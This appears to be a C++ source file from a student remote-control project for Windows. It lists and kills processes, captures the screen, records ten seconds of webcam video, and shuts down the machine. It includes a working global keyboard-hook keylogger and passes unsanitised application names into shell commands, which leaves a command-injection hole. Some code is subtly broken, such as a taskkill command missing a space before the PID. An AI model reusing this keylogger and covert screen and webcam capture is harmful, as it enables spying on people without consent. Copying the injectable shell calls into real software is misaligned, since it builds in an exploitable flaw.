#include "CommandExecutor.h"
#include <iostream>
#include <string>
#include <cstdio>
#include <memory>    // std::unique_ptr
#include <stdexcept> // std::runtime_error
#include <array>     // std::array for buffer

#ifdef _WIN32
#include <windows.h> // Windows API
#endif

#include <opencv2/opencv.hpp>
#include <fstream>
#include <thread>
#include <map>
bool isKeyLogging = false;
std::thread keylogThread;
std::string keyLogbuffer;
bool keyState[256]{false};
HHOOK hookHandle = NULL;

/**
 * @brief Helper function used to execute a shell command
 *        and return its output as a string.
 *
 * @param cmd The full shell command (e.g., "tasklist", "ps aux").
 * @return The console output produced by the executed command.
 */
std::string CommandExecutor::executeShellCommand(const char *cmd)
{
    std::array<char, 128> buffer{};
    std::string result;

    // unique_ptr to ensure pclose() is always called (RAII)
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);

    if (!pipe)
        throw std::runtime_error("Error: _popen() failed!");

    // Read output in cmd line by line
    while (fgets(buffer.data(), buffer.size(), pipe.get()))
        result += buffer.data();

    return result;
}

// --- Application Management ---
std::string CommandExecutor::ListApplications()
{
    std::cout << "[Module 2] Executing: List Applications.\n";
    return executeShellCommand("dir \"C:\\Program Files\""); // "tasklist /APPS /FO CSV /NH"
}
void CommandExecutor::StartApplication(const std::string &applicationName)
{
    std::cout << "[Module 2] Executing: Start Application (" << applicationName << ").\n";
    std::string cmd = "start \"\" \"" + applicationName + "\"";
    executeShellCommand(cmd.c_str());
}
void CommandExecutor::KillApplication(const std::string &applicationIdOrName)
{
    std::cout << "[Module 2] Executing: Kill Application (" << applicationIdOrName << ").\n";
    // F: Force (to close)
    // T:Tree (kill all sub processes)
    // Check if input is PID or Name
    std::string cmd;
    try
    {
        std::stoul(applicationIdOrName);
        // If no error -> PID
        cmd = "taskkill /F /T /PID " + applicationIdOrName;
    }
    catch (const std::exception &)
    {
        // If fail -> Name
        cmd = "taskkill /F /T /IM \"" + applicationIdOrName + "\"";
    }
    executeShellCommand(cmd.c_str());
}

// --- Process Management ---
std::string CommandExecutor::ListProcess()
{
    std::cout << "[Module 2] Executing: List Processes.\n";
    return executeShellCommand("tasklist");
}
void CommandExecutor::StartProcess(const std::string &processName)
{
    std::cout << "[Module 2] Executing: Start Process (" << processName << ").\n";
    std::string cmd = "start \"\" \"" + processName + "\"";
    executeShellCommand(cmd.c_str());
}
void CommandExecutor::KillProcess(const std::string &processIdOrName)
{
    std::cout << "[Module 2] Executing: Kill Process (" << processIdOrName << ").\n";

    std::string cmd;
    try
    {
        std::stoul(processIdOrName);
        // If no error -> PID
        cmd = "taskkill /F /PID" + processIdOrName;
    }
    catch (const std::exception &)
    {
        // If fail -> Name
        cmd = "taskkill /F /IM \"" + processIdOrName + "\"";
    }
    executeShellCommand(cmd.c_str());
}

// --- Screen Capture ---
std::vector<uint8_t> CommandExecutor::PrintScreen()
{
    // return std::vector<uint8_t>();
    SetProcessDpiAwarenessContext(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2);

    // lay kich thuoc man hinh
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    // lay DC cua man hinh
    HDC hScreenDC = GetDC(NULL);
    // tao DC tuong thich
    HDC hmemDC = CreateCompatibleDC(hScreenDC);

    // tao bitmap de chua anh
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    // chon bitmap vao DC phu
    HBITMAP oldBitmap = (HBITMAP)SelectObject(hmemDC, hBitmap);
    // copy man hinh -> bitmap bang BitBlt
    BOOL success = BitBlt(
        hmemDC,
        0, 0,
        width,
        height,
        hScreenDC,
        0, 0,
        SRCCOPY);
    if (!success)
    {
        std::cout << "BitBlt isn't success\n";
        return {};
    }
    BITMAPINFO bi = {};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = width;    // chiều rộng bitmap
    bi.bmiHeader.biHeight = -height; // chiều cao âm để top-down
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32; // 32 bit/pixel (BGRA)
    bi.bmiHeader.biCompression = BI_RGB;

    // lay raw pixel tu HBITMAP
    std::vector<uint8_t> pixels(width * height * 4);
    GetDIBits(hmemDC, hBitmap, 0, height, pixels.data(), &bi, DIB_RGB_COLORS);

    // nen anh (PNG/JPG) -> dung opencv
    cv::Mat frame(height, width, CV_8UC4, pixels.data());
    std::vector<uint8_t> buffer;
    cv::imencode(".png", frame, buffer);

    /* doc buffer vao file.png */
    // std::ofstream file("D:/C++/mang_may_tinh/Process_webcam_project/ScreenshotTest/picture1.png", std::ios::binary);
    // if (!file)
    // {
    //     std::cout << "Cannot open file\n";
    //     return {};
    // }
    // file.write(reinterpret_cast<char *>(buffer.data()), buffer.size());

    SelectObject(hmemDC, oldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hmemDC);
    ReleaseDC(NULL, hScreenDC);
    return buffer;
}

// --- Keylogger ---
void HandleKeyPress(DWORD vkCode)
{
    if (keyState[vkCode] == false)
    {
        keyState[vkCode] = true; // danh dau phim dang nhan
        std::unordered_map<DWORD, std::string> specialKeys = {
            {VK_UP, "UP"},
            {VK_DOWN, "DOWN"},
            {VK_LEFT, "LEFT"},
            {VK_RIGHT, "RIGHT"},
            //
            {VK_SPACE, "SPACE"},
            {VK_TAB, "TAB"},
            {VK_HOME, "HOME"},
            {VK_END, "END"},
            {VK_RETURN, "ENTER"},
            {VK_ESCAPE, "ESC"},
            {VK_BACK, "BACKSPACE"},
            {VK_DELETE, "DELETE"},
            {VK_INSERT, "INSERT"},
            {VK_LSHIFT, "LSHIFT"},
            {VK_RSHIFT, "RSHIFT"},
            {VK_LCONTROL, "LCTRL"},
            {VK_RCONTROL, "RCTRL"},
            {VK_LMENU, "LALT"},
            {VK_RMENU, "RALT"},
            {VK_LWIN, "LWIN"},
            {VK_RWIN, "RWIN"},

            //
            {VK_OEM_1, ";"},
            {VK_OEM_PLUS, "="},
            {VK_OEM_COMMA, ","},
            {VK_OEM_MINUS, "-"},
            {VK_OEM_PERIOD, "."},
            {VK_OEM_2, "/"},
            {VK_OEM_3, "`"},
            {VK_OEM_4, "["},
            {VK_OEM_5, "\\"},
            {VK_OEM_6, "]"},
            {VK_OEM_7, "'"}};

        std::string tmp;
        auto it = specialKeys.find(vkCode);
        if (it != specialKeys.end())
        {
            tmp = it->second;
        }
        else if (vkCode >= 0x41 && vkCode <= 0x5A)
        {
            tmp = std::string(1, 'A' + (vkCode - 0x41));
        }
        else if (vkCode >= 0x30 && vkCode <= 0x39)
        {
            tmp = std::string(1, '0' + (vkCode - 0x30));
        }
        else if (vkCode >= 0x60 && vkCode <= 0x69)
        {
            tmp = "NUM" + std::to_string(vkCode - 0x60);
        }
        else if (vkCode >= VK_F1 && vkCode <= VK_F12)
        {
            tmp = "F" + std::to_string(vkCode - VK_F1 + 1);
        }
        else
        {
            tmp = "UNKNOWN";
        }
        keyLogbuffer = keyLogbuffer + "[" + tmp + "]  ";
    }
}

// void HandleKeyRelease(DWORD vkCode)
// {
//     keyState[vkCode] = false;
// }

LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode < 0)
    {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    KBDLLHOOKSTRUCT *keyInfoPtr = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);

    // lay du lieu
    DWORD vkCode = keyInfoPtr->vkCode;
    DWORD scanCode = keyInfoPtr->scanCode;
    DWORD flags = keyInfoPtr->flags;

    // kiem tra loai su kien phim
    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
    {
        HandleKeyPress(vkCode);
    }
    else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
    {
        // HandleKeyRelease(vkCode);
        // HandleKeyPress(vkCode);
        keyState[vkCode] = false;
    }
    else
    {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
    return 0;
}
void CommandExecutor::StartKeyLogging()
{
    if (isKeyLogging == true)
        return;

    isKeyLogging = true;

    // tao thread chay ngam
    keylogThread = std::thread([this]()
                               {
                                 hookHandle = SetWindowsHookEx(
                                     WH_KEYBOARD_LL,
                                     KeyboardCallback,
                                     GetModuleHandle(NULL),
                                     0);

                                 if (hookHandle == NULL)
                                 {
                                     isKeyLogging = false;
                                     DWORD err = GetLastError();
                                     std::cout<<err<<"\n";
                                     return;
                                 }

                                 // vong lap giu thread song
                                 while(isKeyLogging)
                                 {   
                                    MSG msg;
                                    while (isKeyLogging && GetMessage(&msg, NULL, 0, 0))
                                    {
                                        //  Sleep(10);
                                        TranslateMessage(&msg);
                                        DispatchMessage(&msg);
                                    }
                                 }
                                    
                                 // user tat logger
                                 UnhookWindowsHookEx(hookHandle);
                                 hookHandle = NULL; });

    keylogThread.detach();
}
std::string CommandExecutor::GetLoggedKeys()
{
    // return "";
    isKeyLogging = false;
    return keyLogbuffer;
}

// --- Webcam Capture / Video ---
std::vector<uint8_t> CommandExecutor::Capture()
{
    // return std::vector<uint8_t>();
    const int duration_seconds = 10;
    cv::VideoCapture cap(0);
    if (!cap.isOpened())
        return {};
    int fps = 30;
    int width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
    int height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));
    int frame_count = fps * duration_seconds;

    // cv::VideoWriter writer("temp.mp4", cv::VideoWriter::fourcc('M', 'J', 'P', 'G'), fps, cv::Size(width, height));
    cv::VideoWriter writer("D:/video1.mp4", cv::VideoWriter::fourcc('a', 'v', 'c', '1'), fps, cv::Size(width, height));
    if (!writer.isOpened())
    {
        std::cout << "Cannot open VideoWriter\n";
        return {};
    }

    for (int i = 0; i < frame_count; i++)
    {
        cv::Mat frame;
        cap >> frame;
        if (frame.empty())
            break;
        writer.write(frame);
    }
    writer.release();
    cap.release();

    // doc file  vao mang byte
    std::ifstream file("D:/video1.mp4", std::ios::binary);
    if (!file)
    {
        std::cout << "Cannot open file\n";
        return {};
    }
    std::vector<uint8_t> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    return buffer;
}

// --- System Control ---
void CommandExecutor::Shutdown()
{
    std::cout << "[Module 2] Executing: Shutdown.\n";
    executeShellCommand("shutdown /s /t 0"); // could set to shutdown after 'time'
}
void CommandExecutor::Restart()
{
    std::cout << "[Module 2] Excuting: Restart.\n";
    executeShellCommand("shutdown /r /t 0");
}
